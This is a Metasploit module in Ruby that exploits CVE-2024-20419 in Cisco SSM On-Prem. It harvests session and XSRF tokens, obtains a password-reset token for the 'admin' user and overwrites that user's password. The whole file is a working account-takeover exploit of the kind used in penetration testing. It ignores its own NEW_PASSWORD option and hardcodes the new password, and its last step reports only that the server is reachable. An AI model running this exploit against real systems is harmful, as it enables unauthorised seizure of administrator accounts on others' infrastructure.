class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco SSM On-Prem Account Takeover (CVE-2024-20419)',
        'Description' => %q{
          This module exploits an account takeover vulnerability in Cisco SSM On-Prem <= 8-202206, by changing the
          password of the admin user to an attacker-controlled one..
        },
        'Author' => [
          'Mohammed Adel', # Discovery and PoC
          'Michael Heinzl' # MSF Module
        ],
        'References' => [
          ['CVE', '2024-20419'],
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy#vp'],
          ['URL', 'https://www.0xpolar.com/blog/CVE-2024-20419']
        ],
        'DisclosureDate' => '2024-07-20',
        'DefaultOptions' => {
          'RPORT' => 8443
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)])
    ])
  end

  def run
    # 1) Request oauth_adfs
    print_status('Starting workflow...')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'backend/settings/oauth_adfs'),
      'vars_get' => {
        'hostname' => 'AAAAA'
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    case res.code
    when 200
      print_good('Server reachable.')
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end

    raw_res = res.to_s

    # Extract XSRF-TOKEN value
    xsrf_token_regex = /XSRF-TOKEN=([^;]*)/
    xsrf_token = xsrf_token_regex.match(raw_res)
    print_status('xsrf_token: ' + xsrf_token[1])

    decoded_xsrf_token = decode_url(xsrf_token[1])
    print_status('xsrf_token: ' + decoded_xsrf_token)

    # Extract _lic_engine_session value
    lic_token_regex = /_lic_engine_session=([^;]*)/
    lic_token = lic_token_regex.match(raw_res)
    decoded_lic_token = decode_url(lic_token[1])

    print_status('_lic_engine_session: ' + decoded_lic_token)

    # 2) generate_code
    payload = '{"uid": "admin"}'

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token,
        'Cookie' => "_lic_engine_session=#{decoded_lic_token}; XSRF-TOKEN=#{decoded_xsrf_token}"
      },
      'uri' => normalize_uri(target_uri.path, '/backend/reset_password/generate_code'),
      'data' => payload
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    case res.code
    when 200
      print_good('Server reachable.')
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end

    raw_res = res.body

    auth_token_regex = /"auth_token":"([^"]*)"/
    auth_token = auth_token_regex.match(raw_res)
    print_status('auth_token: ' + auth_token[1])

    # 3) reset_password
    payload = "{\"uid\": \"admin\", \"auth_token\": \"#{auth_token[1]}\", \"password\": \"Testbaaasab@123456780\", \"password_confirmation\": \"Testbaaasab@123456780\", \"common_name\": \"\"}"

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token,
        'Cookie' => "_lic_engine_session=#{decoded_lic_token}; XSRF-TOKEN=#{decoded_xsrf_token}"
      },
      'uri' => normalize_uri(target_uri.path, '/backend/reset_password'),
      'data' => payload
    })

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    case res.code
    when 200
      print_good('Server reachable.')
    else
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end

  end

  def decode_url(encoded_string)
    encoded_string.gsub(/%([0-9A-Fa-f]{2})/) do
      [::Regexp.last_match(1).to_i(16)].pack('C')
    end
  end

end
